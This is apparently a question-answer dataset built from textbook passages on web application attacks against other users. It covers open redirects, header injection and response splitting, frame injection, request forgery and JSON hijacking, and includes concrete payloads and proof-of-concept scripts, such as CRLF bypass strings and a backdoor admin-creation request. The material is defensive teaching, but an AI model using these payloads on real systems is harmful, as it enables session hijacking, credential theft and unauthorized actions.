wahh-app.com\nHTTP/1.1 302 Object moved\nLocation: http://wahh-app.com/private/admin.php\nIn this situation, the application may or may not be vulnerable. If the prefix\nused consists of http:// and the application’s domain name but does not\ninclude a slash character after the domain name, then it is vulnerable. For\nexample, the URL\nhttp://wahh-app.com/redir.php?target=.wahh-attacker.com\nwill cause a redirect to\nhttp://wahh-app.com.wahh-attacker.com\nwhich is under the control of the attacker, assuming that he controls the DNS\nrecords for the domain wahh-attacker.com.\nIf, however, the absolute URL prefix does include a trailing slash, or a sub-\ndirectory on the server, then the application is probably not vulnerable to a\nredirection attack aimed at an external domain. The best an attacker can prob-\nably achieve is to frame a URL that redirects a user to a different URL within\nthe same application. This attack does not normally accomplish anything,\nbecause if the attacker is able to induce a user to visit one URL within the\napplication, then he can presumably just as easily feed the second URL to them\ndirectly.\nNOTE In cases where the redirect is initiated using client-side JavaScript that\nqueries data from the DOM, the entire code responsible for performing the\nredirect and any associated validation is typically visible on the client. This\nshould be closely reviewed to determine how user-controllable data is being\nincorporated into the URL, whether any validation is being performed, and if so,\nwhether any bypasses exist to the validation. Bear in mind that as with DOM-\nbased XSS, some additional validation may be performed on the server prior to\nthe script being returned to the browser. The following JavaScript APIs may be\nused to perform redirects:\n■■ document.location\n■■ document.URL\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 433\nChapter 12 ■ Attacking Other Users 433\n■■ document.open()\n■■ window.location.href\n■■ window.navigate()\n■■ window.open()\nPreventing Redirection Vulnerabilities\nThe most effective way to avoid arbitrary redirection vulnerabilities is to not\nincorporate user-supplied data into the target of a redirect at all. There are var-\nious reasons why developers are inclined to use this technique, but there are\nusually alternatives available. For example, it is common to see a user interface\nthat contains a list of links, each pointing to a redirection page and passing a\ntarget URL as a parameter. Here, possible alternative approaches include the\nfollowing:\n■■ Remove the redirection page from the application, and replace links to\nit with direct links to the relevant target URLs.\n■■ Maintain a list of all valid URLs for redirection. Instead of passing the\ntarget URL as a parameter to the redirect page, pass an index into this\nlist. The redirect page should look up the index in its list and return a\nredirect to the relevant URL.\nIf it is considered unavoidable for the redirection page to receive user-\ncontrollable input and incorporate this into the redirect target, one of the fol-\nlowing measures should be used to minimize the risk of redirection attacks:\n■■ The application should use relative URLs in all of its redirects, and the\nredirect page should strictly validate that the URL received is a relative\nURL. It should verify that the user-supplied URL either begins with a\nsingle slash followed by a letter or begins with a letter and does not\ncontain a colon character before the first slash. Any other input should\nbe rejected, not sanitized.\n■■ The application should use URLs relative to the web root for all of its\nredirects, and the redirect page should prepend http://yourdomainname\n.comto all user-supplied URLs before issuing the redirect. If the user-\nsupplied URL does not begin with a slash character, it should instead be\nprepended with http://yourdomainname.com/.\n■■ The application should use absolute URLs for all redirects, and the\nredirect page should verify that the user-supplied URL begins with\nhttp://yourdomainname.com/before issuing the redirect. Any other\ninput should be rejected."
  },
  {
    "input": "HTTP Header Injection",
    "output": "70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 434\n434 Chapter 12 ■ Attacking Other Users\nAs with DOM-based XSS vulnerabilities, it is recommended that applica-\ntions do not perform redirects via client-side scripts on the basis of DOM data,\nas this data is outside of the server’s direct control.\nHTTP Header Injection\nHTTP header injection vulnerabilities arise when user-controllable data is\ninserted in an unsafe manner into an HTTP header returned by the applica-\ntion. If an attacker can inject newline characters into the header he controls, he\ncan insert additional HTTP headers into the response and can write arbitrary\ncontent into the body of the response.\nThis vulnerability arises most commonly in relation to the Location and\nSet-Cookie headers, but it may conceivably occur for any HTTP header. You\nsaw previously how an application may take user-supplied input and insert\nthis into the Locationheader of a 3xx response. In a similar way, some appli-\ncations take user-supplied input and insert this into the value of a cookie. For\nexample:\nGET /home.php?uid=123 HTTP/1.1\nHost: wahh-app.com\nHTTP/1.1 200 OK\nSet-Cookie: UserId=123\n...\nIn either of these cases, it may be possible for an attacker to construct a\ncrafted request using the carriage-return (0x0d) and/or line-feed (0x0a) char-\nacters to inject a newline into the header they control, and so insert further\ndata on the following line. For example:\nGET /home.php?uid=123%0d%0aFoo:+bar HTTP/1.1\nHost: myapp.com\nHTTP/1.1 200 OK\nSet-Cookie: UserId=123\nFoo: bar\n...\nExploiting Header Injection Vulnerabilities\nPotential header injection vulnerabilities can be detected in a similar way to\nXSS vulnerabilities, since you are looking for cases where user-controllable\ninput reappears anywhere within the HTTP headers returned by the applica-\ntion. Hence, in the course of probing the application for XSS vulnerabilities,\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 435\nChapter 12 ■ Attacking Other Users 435\nyou should also identify any locations where the application may be vulnera-\nble to header injection.\nHACK STEPS\n■ For each potentially vulnerable instance in which user-controllable input\nis copied into an HTTP header, verify whether the application accepts\ndata containing URL-encoded carriage-return (%0d) and line-feed (%0a)\ncharacters, and whether these are returned unsanitized in its response.\n■ Note that you are looking for the actual newline characters themselves to\nappear in the server’s response, not their URL-encoded equivalents. If\nyou view the response in an intercepting proxy, you should actually see\nan additional line in the HTTP headers if the attack was successful.\n■ If only one of the two newline characters is returned in the server’s\nresponses, it may still be possible to craft a working exploit, depending\non the context.\n■ If you find that newline characters are being blocked or sanitized by the\napplication, then the following bypasses should be attempted:\nfoo%00%0d%0abar\nfoo%250d%250abar\nfoo%%0d0d%%0a0abar\nIf it is possible to inject arbitrary headers and message body content into the\nresponse, then this behavior can be used to attack other users of the applica-\ntion in various ways.\nInjecting Cookies\nA URL can be constructed that sets arbitrary cookies within the browser of any\nuser who requests it. For example:\nGET /redir.php?target=/%0d%0aSet-cookie:+SessId%3d120a12f98e8; HTTP/1.1\nHost: wahh-app.com\nHTTP/1.1 302 Object moved\nLocation: /\nSet-cookie: SessId=120a12f98e8;\nIf suitably configured, these cookies may persist across different browser\nsessions. Target users can be induced to access the malicious URL via the same\ndelivery mechanisms that were described for reflected XSS vulnerabilities\n(email, third-party web site, etc.).\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 436\n436 Chapter 12 ■ Attacking Other Users\nDepending on the application, setting a particular cookie may interfere\nwith the application’s logic to the disadvantage of the user (for example,\nUseHttps=false). Also, setting an attacker-controlled session token may be\nused to perform a session fixation attack (described later in this chapter).\nDelivering Other Attacks\nBecause HTTP header injection enables an attacker to control the entire body\nof a response, it can be used as a delivery mechanism for practically any attack\nagainst other users, including virtual web site defacement, script injection,\narbitrary redirection, attacks against ActiveX controls, and so on.\nHTTP Response Splitting\nThis is an attack technique which seeks to poison a proxy server’s cache with\nmalicious content, in order to compromise other users who access the applica-\ntion via the proxy. For example, if all users on a corporate network access an\napplication via a caching proxy, the attacker can target them by injecting mali-\ncious content into the proxy’s cache, which will be displayed to any users who\nrequest the affected page.\nA header injection vulnerability can be exploited to deliver a response split-\nting attack using the following steps:\n1. The attacker chooses a page of the application that he wishes to poison\nwithin the proxy cache. For example, he might replace the page at\n/admin/with a Trojan login form that submits the user’s credentials to\nthe attacker’s server.\n2. The attacker locates a header injection vulnerability and formulates a\nrequest that injects an entire HTTP body into the response, plus a sec-\nond set of response headers, and a second response body. The second\nresponse body contains the HTML source code for his Trojan login\nform. The effect is that the server’s response looks exactly like two sep-\narate HTTP responses chained together. Hence the name of the attack\ntechnique, because the attacker has effectively “split” the server’s\nresponse into two separate responses. For example:\nGET /home.php?uid=123%0d%0aContent-Length:+22%0d%0a%0d%0a<html>%0d%\n0afoo%0d%0a</html>%0d%0aHTTP/1.1+200+OK%0d%0aContent-Length:\n+2307%0d%0a%0d%0a<html>%0d%0a<head>%0d%0a<title>Administrator+login\n</title>0d%0a[...long URL...] HTTP/1.1\nHost: wahh-app.com\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 437\nChapter 12 ■ Attacking Other Users 437\nHTTP/1.1 200 OK\nSet-Cookie: UserId=123\nContent-Length: 22\n<html>\nfoo\n</html>\nHTTP/1.1 200 OK\nContent-Length: 2307\n<html>\n<head>\n<title>Administrator login</title>\n...\n3. The attacker opens a TCP connection to the proxy server and sends his\ncrafted request followed immediately by a request for the page to be\npoisoned. Pipelining requests in this way is legal in the HTTP protocol:\nGET http://wahh-app.com/home.php?uid=123%0d%0aContent-Length:+22%0d\n%0a%0d%0a<html>%0d%0afoo%0d%0a</html>%0d%0aHTTP/1.1+200+OK%0d%\n0aContent-Length:+2307%0d%0a%0d%0a<html>%0d%0a<head>%0d%0a\n<title>Administrator+login</title>0d%0a[...long URL...] HTTP/1.1\nHost: wahh-app.com\nProxy-Connection: Keep-alive\nGET http://wahh-app.com/admin/ HTTP/1.1\nHost: wahh-app.com\nProxy-Connection: Close\n4. The proxy server opens a TCP connection to the application, and sends\nthe two requests pipelined in the same way.\n5. The application responds to the first request with the attacker’s injected\nHTTP content, which looks exactly like two separate HTTP responses.\n6. The proxy server receives these two apparent responses, and interprets\nthe second as being the response to the attacker’s second pipelined\nrequest, which was for the URL http://wahh-app/admin/. The proxy\ncaches this second response as the contents of this URL. (If the proxy\nhas already stored a cached copy of the page, the attacker can cause it\nto re-request the URL and update its cache with the new version by\ninserting an appropriate If-Modified-Sinceheader into his second\nrequest and a Last-Modifiedheader into the injected response.)"
  },
  {
    "input": "Frame Injection",
    "output": "70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 438\n438 Chapter 12 ■ Attacking Other Users\n7. The application issues its actual response to the attacker’s second\nrequest, containing the authentic contents of the URL http://wahh-\napp.com/admin/. The proxy server does not recognize this as being a\nresponse to a request that it has actually issued, and so discards it.\n8. A user accesses http://wahh-app/admin/via the proxy server and\nreceives the content of this URL which was stored in the proxy’s cache.\nThis content is in fact the attacker’s Trojan login form, so the user’s cre-\ndentials are compromised.\nPreventing Header Injection Vulnerabilities\nThe most effective way to prevent HTTP header injection vulnerabilities is to\nnot insert user-controllable input into the HTTP headers returned by the appli-\ncation. As you saw with arbitrary redirection vulnerabilities, there are usually\nsafer alternatives available to this behavior.\nIf it is considered unavoidable to insert user-controllable data into HTTP\nheaders, the application should employ a twofold defense-in-depth approach\nto prevent any vulnerabilities arising:\n■■ Input validation — The application should perform context-dependent\nvalidation of the data being inserted, in as strict a manner as possible.\nFor example, if a cookie value is being set based on user input, it may\nbe appropriate to restrict this to alphabetical characters only, and a max-\nimum length of six bytes.\n■■ Output validation — Every piece of data being inserted into headers\nshould be filtered to detect potentially malicious characters. In practice,\nany character with an ASCII code below 0x20 should be regarded as\nsuspicious, and the request should be rejected.\nApplications can prevent any remaining header injection vulnerabilities\nfrom being used to poison proxy server caches by using HTTPS for all appli-\ncation content.\nFrame Injection\nFrame injection is a relatively simple vulnerability that arises from the fact that\nin many browsers, if a web site creates a named frame, then any window\nopened by the same browser process is permitted to write the contents of that\nframe, even if its own content was issued by a different web site.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 439\nChapter 12 ■ Attacking Other Users 439\nNOTE The latest versions of most browsers have modified their behavior in\nrelation to named frames and, by default, extend the same origin policy to\nprevent one web site from writing the content of a frame that was issued by a\ndifferent domain. As users gradually migrate to the latest browsers, this\ncategory of vulnerability will cease to be relevant.\nHACK STEPS\n■ If the application uses frames, review the HTML source of the main\nbrowser window, which should contain the code for the frameset.\n■ If the frameset assigns a name to each frame, it is probably vulnerable,\nas in the following example, indicated by the presence of the name\nattribute in the tag that creates each frame:\n<frameset rows=”50,*“ >\n<frame src=”top_menu.asp” name=”top_menu”\nframeborder=”yes” title=”Top menu”>\n<frame src=”left_menu.asp” name=”left_menu”\nframeborder=”yes” title=”Left menu”>\n<frame src=”main_display.asp” name=”main_display”\nframeborder=”yes” title=”Main display”>\n</frameset>\n■ If the frameset uses named frames, but the names appear to be highly\ncryptic or random, access the application several times from different\nbrowsers, and review whether the frame names change. If they do so,\nand there is no way for an attacker to predict the names of other users’\nframes, then the application is probably not vulnerable.\nExploiting Frame Injection\nIf the application is vulnerable to frame injection, then an attacker can exploit\nthis using the following steps:\n1. The attacker creates an innocuous-looking web site containing a script\nthat wakes up every 10 seconds and attempts to overwrite the contents\nof the frame named main_display. The new content is hosted on the\nattacker’s site and contains Trojan functionality that looks identical to\nthe normal wahh-app.comcontent, but transmits any entered data to the\nattacker.\n2. The attacker either waits for wahh-app.comusers to browse to his\ninnocuous site, or uses some proactive means of inducing them to do\nso, such as sending emails, buying banner ads, and so on."
  },
  {
    "input": "Request Forgery",
    "output": "70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 440\n440 Chapter 12 ■ Attacking Other Users\n3. A user browses the attacker’s innocuous-looking web site. If the user is\nsimultaneously using wahh-app.com, or does so whilethe attacker’s site\nis being displayed in another browser window, then the attacker’s Tro-\njan content will overwrite the frame main_displayin the wahh-app.com\nwindow. If the user continues using what appears to be the wahh-app\n.comapplication, then any data he enters will be submitted to the\nattacker.\nThis type of attack bears similarities to phishing attacks in which the\nattacker constructs a cloned web site and seeks to entice unwitting users to\naccess it. However, in the case of frame injection, the attack is more sophisti-\ncated and much more convincing, because the cloned content actually replaces\nthe authentic content within a browser window whose URL still points to the\ngenuine application.\nIf the application being targeted uses HTTPS, then the attack will still suc-\nceed, and the security padlock displayed by the browser window will con-\ntinue to show the correct certificate for wahh-app.com. This is because when a\nbrowser displays a frameset, the security information for the main window\nrelates to the page containing the frameset, which in this case still originates\nfrom wahh-app.com. Hence, even a well-informed user may not notice an\nattack of this kind.\nPreventing Frame Injection\nThere are two available mitigations to frame injection vulnerabilities:\n■■ If there is no requirement for the application’s different frames to inter-\ncommunicate, remove frame names altogether and make them anony-\nmous. However, because intercommunication is normally required, this\noption is usually not feasible.\n■■ Use named frames but make them unique to each session and unpre-\ndictable. One possible option is to append the user’s session token to\neach base frame name such as main_display.\nRequest Forgery\nThis category of attack (also known as session riding) is closely related to ses-\nsion hijacking attacks, in which an attacker captures a user’s session token and\nso is able to use the application “as” that user. With request forgery, however,\nthe attacker need never actually know the victim’s session token. Rather, the\nattacker exploits the normal behavior of web browsers in order to hijack a\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 441\nChapter 12 ■ Attacking Other Users 441\nuser’s token, causing it to be used to make requests that the user does not\nintend to make.\nRequest forgery vulnerabilities come in two flavors: on-site and cross-site.\nOn-Site Request Forgery\nOn-site request forgery (OSRF) is a familiar attack payload for exploiting\nstored XSS vulnerabilities. In the MySpace worm, Samy placed a script within\nhis profile that caused any user viewing the profile to perform various unwit-\nting actions. What is often overlooked is that stored OSRF vulnerabilities can\nexist even in situations where XSS is not possible.\nConsider a message board application that lets users submit items that are\nviewed by other users. Messages are submitted using a request like the\nfollowing:\nPOST /submit.php\nHost: wahh-app.com\nContent-Length: 34\ntype=question&name=daf&message=foo\nThis request results in the following being added to the messages page:\n<tr>\n<td><img src=”/images/question.gif”></td>\n<td>daf</td>\n<td>foo</td>\n</tr>\nIn this situation, you would of course test for XSS flaws. However, suppose\nthat the application is properly HTML-encoding any “ <and >characters that\nit inserts into the page. Having satisfied yourself that this defense cannot be\nbypassed in any way, you might move on to the next test.\nBut look again. You control part of the target of the <img>tag. Although you\ncannot break out of the quoted string, you can modify the URL to cause any\nuser who views your message to make an arbitrary on-site GET request. For\nexample, submitting the following value in the typeparameter will cause any-\none viewing your message to make a request that attempts to add a new\nadministrative user:\n../admin/newUser.php?username=daf2&password=0wned&role=admin#\nWhen an ordinary user is induced to issue your crafted request, it will of\ncourse fail. But when an administrator views your message, your backdoor\naccount gets created. You have performed a successful OSRF attack even\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 442\n442 Chapter 12 ■ Attacking Other Users\nthough XSS was not possible. And of course, the attack will succeed even if\nadministrators take the precaution of disabling JavaScript.\nIn the preceding attack string, note the # character that effectively termi-\nnates the URL before the .gifsuffix. You could just as easily use &to incorpo-\nrate the suffix as a further request parameter.\nHACK STEPS\n■ In every location where data submitted by one user is displayed to other\nusers but you are unable to perform a stored XSS attack, review whether\nthe application’s behavior leaves it vulnerable to OSRF.\n■ The vulnerability typically arises where user-supplied data is inserted\ninto the target of a hyperlink or other URL within the returned page.\nUnless the application specifically blocks any characters you require (typ-\nically dots, slashes, and the delimiters used in the query string), it is\nalmost certainly vulnerable.\n■ If you discover an OSRF vulnerability, look for a suitable request to target\nin your exploit, as described in the next sectionfor XSRF.\nOSRF vulnerabilities can be prevented by validating user input as strictly as\npossible before it is incorporated into responses. For example, in the specific\ncase described, the application could verify that the typeparameter has one of\na specific range of values. If the application must accept other values that it\ncannot anticipate in advance, then input containing any of the characters / .\n\\ ? &and =should be blocked.\nNote that HTML-encoding these characters is not an effective defense\nagainst OSRF attacks, because browsers will decode the target URL string\nbefore it is requested.\nDepending on the insertion point and the surrounding context, it may also\nbe possible to prevent OSRF attacks using the same defenses described in the\nnext section for XSRF attacks.\nCross-Site Request Forgery\nCross-site request forgery (XSRF) involves a similar delivery mechanism to the\nframe injection attack described earlier. However, XSRF does not involve the\nattacker presenting any spoofed content to the user. Rather, the attacker creates\nan innocuous-looking web site that causes the user’s browser to submit a\nrequest directly to the vulnerable application, to perform some unintended\naction that is beneficial to the attacker.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 443\nChapter 12 ■ Attacking Other Users 443\nRecall that the browser’s same origin policy does not prohibit one web site\nfrom issuing requests to a different domain. It does, however, prevent the orig-\ninating web site from processing the responses to cross-domain requests.\nHence, unlike its on-site counterpart, XSRF attacks are “one-way” only. It\nwould not be possible to perform the multistage actions of the Samy worm in\na pure XSRF attack.\nOne well-known example of an XSRF flaw was found in the eBay applica-\ntion by Dave Armstrong in 2004. It was possible to craft a URL that caused the\nrequesting user to make an arbitrary bid on an auction item. A third-party web\nsite could cause visitors to request this URL, so that any eBay user who visited\nthe web site would place a bid. Further, with a little work, it was possible to\nexploit the vulnerability in a stored OSRF attack within the eBay application\nitself. The application allowed users to place <img> tags within auction\ndescriptions. To defend against attacks, the application validated that the tar-\nget of the tag returned an actual image file. However, it was possible to place\na link to an off-site server that returned a legitimate image at the time the auc-\ntion item was created, and subsequently replace this image with an HTTP redi-\nrect back to the crafted XSRF URL. Thus, anyone who viewed the auction item\nwould unwittingly place a bid on it. More details can be found in the original\nBugtraq post:\nhttp://archive.cert.uni-stuttgart.de/bugtraq/2005/04/msg00279.html\nNOTE The defect in the application’s validation of off-site images is known as\na “time of check, time of use” (TOCTOU) flaw, because an item is validated at\none time and used at another time, and an attacker can modify its value in the\nwindow between these.\nExploiting XSRF Flaws\nXSRF vulnerabilities primarily arise where HTTP cookies are used to transmit\nsession tokens. Once an application has set a cookie in a user’s browser, their\nbrowser will automatically submit that cookie back to the application in every\nsubsequent request. This is so regardless of whether the request originates\nfrom a link provided by the application itself or from a URL received from\nelsewhere, such as in an email or on another web site altogether, or from any\nother source. If the application does not take precautions against misuse of the\ntoken in this way, then it is vulnerable to XSRF.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 444\n444 Chapter 12 ■ Attacking Other Users\nHACK STEPS\n■ Review the key functionality within the application, as enumerated in\nyour application mapping exercises (see Chapter 4).\n■ Find an application function that (a) can be used to perform some sensi-\ntive action on behalf of an unwitting user and (b) employs request para-\nmeters which an attacker can fully determine in advance—that is, which\ndo not contain any session tokens or other unpredictable items. For\nexample:\nPOST /TransferFunds.asp HTTP/1.1\nHost: wahh-app.com\nFromAccount=current&ToSortCode=123456&ToAccountNumber=\n12345678&Amount=1000.00&When=now\n■ Create an HTML page that will issue the desired request without any user\ninteraction. For GETrequests, you can place an <img>tag with the src\nparameter set to the vulnerable URL. For POSTrequests, you can create a\nform that contains hidden fields for all of the relevant parameters\nrequired for the attack and has its target set to the vulnerable URL. You\ncan use JavaScript to auto-submit the form as soon as the page loads.\n■ While logged in to the application, use the same browser to load your\ncrafted HTML page. Verify that the desired action is carried out within the\napplication.\nPreventing XSRF Flaws\nXSRF vulnerabilities arise because of the way browsers automatically submit\ncookies back to the issuing web server with each subsequent request. If a web\napplication relies solely upon HTTP cookies as its mechanism for transmitting\nsession tokens, then it is inherently at risk from this type of attack.\nXSRF attacks can be prevented by not relying only upon cookies in this way.\nIn the most security-critical applications, such as online banks, it is usual to see\nsome session tokens being transmitted via hidden fields in HTML forms.\nWhen each request is submitted, in addition to validating session cookies, the\napplication verifies that the correct tokens were received in the form submis-\nsion. If an application behaves in this way, then an attacker will not be able to\nmount a XSRF attack without already knowing the value of the tokens being\ntransmitted in hidden fields. To be successful, the attacker will already need to\nhave hijacked the user’s session, making any XSRF attack unnecessary.\nDo not make the mistake of relying upon the HTTP Refererheader to indi-\ncate whether a request originated on-site or off-site. The Refererheader can be\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 445\nChapter 12 ■ Attacking Other Users 445\nspoofed using older versions of Flash or masked altogether using a meta\nrefresh tag. In general, the Referer header is not a reliable foundation on\nwhich to build any security defenses within web applications.\nAn anti-XSRF safeguard employed in some applications is to require that\nusers complete multiple steps in order to carry out sensitive actions such as\nfunds transfers. If this is done, then to be effective the application must employ\nsome kind of token or nonce within the multistep process. Typically, at the first\nstage, the application places a token into a hidden form field, and at the second\nstage, it verifies that the same token has been submitted. Because XSRF attacks\nare one-way, the attacking web site cannot retrieve the token from the first\nstage in order to submit it at the second. If the application uses two steps with-\nout the safeguard of a token, then the defense achieves nothing because an\nXSRF attack can simply issue the two required requests in turn, or (very often)\nproceed directly to the second request.\nDefeating Anti-XSRF Defenses via XSS\nIt is often said that anti-XSRF defenses can be defeated if the application contains\nany XSS vulnerabilities. But this is only partly true. The thought behind this the-\nory is correct—that because XSS payloads execute on-site, they can perform\ntwo-way interaction with the application, and so can retrieve tokens from the\napplication’s responses and submit them in subsequent requests. However, if a\npage that is itself protected by anti-XSRF defenses also contains a reflected XSS\nflaw, then this flaw cannotbe used to break the defenses. Don’t forget that the ini-\ntial request in a reflected XSS attack is itself cross-site. The attacker crafts a URL\nor POST request containing malicious input that gets copied into the applica-\ntion’s response. But if the vulnerable page implements anti-XSRF defenses, then\nthe attacker’s crafted request must alreadycontain the required token in order to\nsucceed. If it does not, the request will be rejected and the code path containing\nthe reflected XSS flaw will not execute. The issue here is not about whether\ninjected JavaScript can read any tokens contained in the application’s response\n(of course it can), but rather about getting the JavaScript into a response con-\ntaining those tokens in the first place.\nIn general, there are two situations in which XSS vulnerabilities can be\nexploited to defeat anti-XSRF defenses:\n■■ If there are any stored XSS flaws within the defended functionality,\nthese can always be exploited to defeat the defenses. JavaScript injected\nvia the stored attack can directly read the tokens contained within the\nsame response that the script appears in.\n■■ If the application employs anti-XSRF defenses for only part of its\nauthenticated functionality, and a reflected XSS flaw exists in a function\nthat is not defended against XSRF, then that flaw can be exploited to"
  },
  {
    "input": "JSON Hijacking",
    "output": "70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 446\n446 Chapter 12 ■ Attacking Other Users\ndefeat the anti-XSRF defenses. For example, if an application employs\nanti-XSRF tokens to protect only the second step of a funds transfer\nfunction, then an attacker can leverage a reflected XSS attack elsewhere\nto defeat the defense. A script injected via this flaw can make an on-site\nrequest for the first step of the funds transfer, retrieve the token, and\nuse this to request the second step. The attack is successful because the\nfirst step of the transfer, which is not defended against XSRF, returns\nthe token needed to access the defended page. The reliance on only\nHTTP cookies to reach the first step means that it can be leveraged to\ngain access to the token defending the second step.\nJSON Hijacking\nJSON hijacking is a special version of an XSRF attack, which in certain circum-\nstances can violate the objectives of the browser’s same origin policy. It enables\na malicious web site to retrieve and process data from a different domain,\nthereby circumventing the “one-way” restriction that normally applies to\nXSRF.\nThe possibility of JSON hijacking arises because of a quirk in the same ori-\ngin policy. Recall that browsers treat JavaScript as code, not data—they allow\none web site to retrieve and execute code from a different domain. When the\ncross-domain code executes, it is treated as having originated from the invok-\ning web site, and executes in that context. The reason this quirk can lead to vul-\nnerabilities is that many of today’s complex web applications use JavaScript\nfor transmission of data, in a way that was not foreseen when the same origin\npolicy was devised.\nJSON\nJSON (JavaScript Object Notation) is a simple data transfer format that can be\nused to serialize arbitrary data and can be processed directly by JavaScript\ninterpreters. It is commonly employed in Ajax applications as an alternative to\nthe XML format originally used for data transmission. In a typical situation,\nwhen a user performs an action, client-side JavaScript uses XMLHttpRequestto\ncommunicate the action to the server. The server returns a lightweight\nresponse containing data in JSON format. The client-side script then processes\nthis data and updates the user interface accordingly.\nFor example, an Ajax-based web mail application may contain a panel\nallowing users to tab between different data. When a user clicks the Contacts\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 447\nChapter 12 ■ Attacking Other Users 447\ntab, the browser uses XMLHttpRequestto retrieve the user’s personal contacts,\nwhich are returned using JSON:\n[\n[ ‘Jeff’, ‘1741024918’, ‘ginger@microsoft.com’ ],\n[ ‘C Gillingham’, ‘3885193114’, ‘c2004@symantec.com’ ],\n[ ‘Mike Kemp’, ‘8041148671’, ‘fkwitt@layerone.com’ ],\n[ ‘Wade A’, ‘5078782513’, ‘kingofbeef@ngssoftware.com’ ]\n]\nThe returned message contains valid JavaScript syntax that defines an array.\nThe client-side script uses the JavaScript interpreter to construct the array and\nthen processes its contents.\nAttacks against JSON\nBecause JavaScript is being used to transmit data, rather than pure code, the\npossibility arises for a malicious web site to exploit the same origin policy’s\nhandling of JavaScript and gain access to data generated by other applications.\nThis attack involves an XSRF request, as described previously. However, in the\npresent case, it may be possible for the malicious site to read the data returned\nin the cross-site response, thereby performing two-way interaction with the\ntarget application.\nOf course, it is not possible for a malicious web site to simply load a script\nfrom a different domain and view its contents. That would still violate the\nsame origin policy, regardless of whether the response in question contains\nJavaScript or other content. Rather, the malicious web site uses a <script>tag\nto include the target script and execute it within its own page. With a bit of\nwork, by actually executing the included script, the malicious site can gain\naccess to the data it contains.\nAt the time of this writing, there are two known ways in which a malicious\nsite can perform this trick: by overriding the default array constructor or by\nimplementing a suitable callback function.\nOverriding the Array Constructor\nIf the JSON data returned by the target application contains a serialized array,\nthe malicious web site can override the default constructor for arrays in order\nto gain access to the JSON data when the array is constructed. This attack can\nbe performed as follows in the Firefox browser:\n<script>\nfunction capture(s) {\nalert(s);\n}\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 448\n448 Chapter 12 ■ Attacking Other Users\nfunction Array() {\nfor (var i = 0; i < 3; i++)\nthis[i] setter = capture;\n}\n</script>\n<script src=”http://wahh-app.com/private/contacts.json”></script>\nThis proof-of-concept attack performs three key actions:\n■■ It implements a function called capture, which simply generates an\nalert displaying any data passed to it.\n■■ It overrides the Arrayobject and defines the setter for the first three ele-\nments in the array to be the capturefunction.\n■■ It includes the target JSON object within the page by setting the rele-\nvant URL as the srcattribute of a <script>tag.\nWhen this attack is executed, the target of the <script>tag is retrieved and\nexecuted. The serialized object, which is a multidimensional array containing\nthe victim user’s contacts, is constructed. When each element in the array is\nset, the overridden setter is invoked, enabling the attacker’s script to capture\nthe contents of the element. In the example, the script simply displays a series\nof alerts containing the array data.\nThis exact vulnerability was discovered within the GMail application by\nJeremiah Grossman in 2006. In other instances, attacks can override Object\nrather than Array, with the same effect.\nImplementing a Callback Function\nIn some applications, the JavaScript returned by the vulnerable application\ndoes not contain only a JSON object, but also invokes a callback function on\nthat object. For example:\nshowContacts(\n[\n[ ‘Jeff’, ‘1741024918’, ‘ginger@microsoft.com’ ],\n[ ‘C Gillingham’, ‘3885193114’, ‘c2004@symantec.com’ ],\n[ ‘Mike Kemp’, ‘8041148671’, ‘fkwitt@layerone.com’ ],\n[ ‘Wade A’, ‘5078782513’, ‘kingofbeef@ngssoftware.com’ ]\n]);\nThis technique is often used in mash-ups in which one application includes\na JSON object from another domain, and specifies a call-back function in its\nrequest for the script. The returned script invokes the specified call-back func-\ntion on the JSON object, enabling the invoking application to process the data\nin arbitrary ways.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 449\nChapter 12 ■ Attacking Other Users 449\nBecause this mechanism is specifically designed to work around the\nbrowser’s same origin restrictions, it can of course be abused by an attacker to\ncapture data returned from other domains. In the example shown, an attack\nsimply needs to implement the showContactsfunction and include the target\nscript. For example:\n<script>\nfunction showContacts(a) {\nalert(a);\n}\n</script>\n<script src=”http://wahh-app.com/private/contacts.json?callback=\nshowContacts”></script>\nFinding JSON Hijacking Vulnerabilities\nBecause JSON hijacking is a species of cross-site request forgery, some\ninstances of it can be identified using the same methodology as was described\nfor XSRF. However, because JSON hijacking allows you to retrieve arbitrary\ndata from another domain, and not only perform cross-domain actions, you\nare interested in a different range of functionality than you are when probing\nfor standard XSRF flaws.\nHACK STEPS\n■ If the application uses Ajax, look for any instances where a response\ncontains sensitive data in JSON format or other JavaScript.\n■ As with standard XSRF, determine whether it is possible to construct a\ncross-domain request to retrieve the data. If the request does not contain\nany unpredictable parameters, then the application may be vulnerable.\n■ JSON hijacking attacks can only be performed using the GETmethod,\nbecause this is the method used when a URL specified in a <script>\ninclude is retrieved. If the application’s own request uses the POST\nmethod, determine whether the request is still accepted when you\nchange the method to GETand move the body parameters to the URL\nquery string.\n■ If the preceding requirements are met, determine whether you can con-\nstruct a web page that will succeed in gaining access to the target appli-\ncation’s response data, by including it via a <script>tag. Try the two\ntechniques described, or any others that may be appropriate in unusual\nsituations."
  },
  {
    "input": "Session Fixation",
